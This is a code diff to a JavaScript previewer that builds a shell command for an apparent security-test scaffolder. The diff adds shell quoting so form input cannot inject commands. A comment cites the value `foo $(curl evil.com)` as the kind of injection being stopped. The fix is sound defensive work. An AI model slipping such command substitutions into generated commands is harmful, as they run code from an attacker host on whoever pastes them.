@@ -1008,6 +1008,10 @@
   // scaffolder (python -m tools.scaffolder) is the engine; this previews its output.
   (function () {
     function slug(s) { return s.toLowerCase().replace(/[^a-z0-9]+/g, "_").replace(/^_|_$/g, ""); }
+    // POSIX single-quote: wrap in '...' and escape any embedded quote as '\''. Single
+    // quotes make the shell treat the value as a pure literal — no $(), backtick, or
+    // $VAR expansion — so a value pasted from the form can never inject a command.
+    function shq(s) { return "'" + String(s).replace(/'/g, "'\\''") + "'"; }
     function owaspFor(v) {
       v = v.toLowerCase();
       if (v.includes("sql")) return "OWASP A03";
@@ -1032,15 +1036,20 @@
       const ready = !!(vuln && scope), owasp = owaspFor(vuln);
       const gate = depth === "passive" ? "" : '<span class="lb">gate</span>';
       const multi = depth === "full-chain" ? '<span class="lb">multi-step</span>' : "";
+      // vuln/scope are raw form input — shell-quote them so a value like
+      // `foo $(curl evil.com)` is a literal string in the copied command, never a
+      // command substitution that would run the instant the line is pasted. name is
+      // slug()'d to [a-z0-9_] and owasp is from a fixed set, so both are safe unquoted.
+      const desc = "Confirm " + (vuln || "<vuln>") + " on " + (scope || "<scope>") + ".";
       const cmd =
         "python -m tools.scaffolder \\\n" +
         "  --name " + name + " \\\n" +
-        '  --owasp-class "' + owasp + '" \\\n' +
+        "  --owasp-class " + shq(owasp) + " \\\n" +
         '  --target-path "/<path>?q=" \\\n' +
         '  --payload "<probe>" \\\n' +
         "  --marker LEASH_" + name.toUpperCase() + "_7731 \\\n" +
         "  --severity high \\\n" +
-        '  --description "Confirm ' + (vuln || "<vuln>") + " on " + (scope || "<scope>") + '."';
+        "  --description " + shq(desc);
       box.innerHTML =
         '<div class="spec' + (ready ? "" : " byo") + '" style="margin:0;">' +
           '<div class="spec-head"><div><div class="sname">' + esc(vuln || "(unnamed)") + "</div>" +
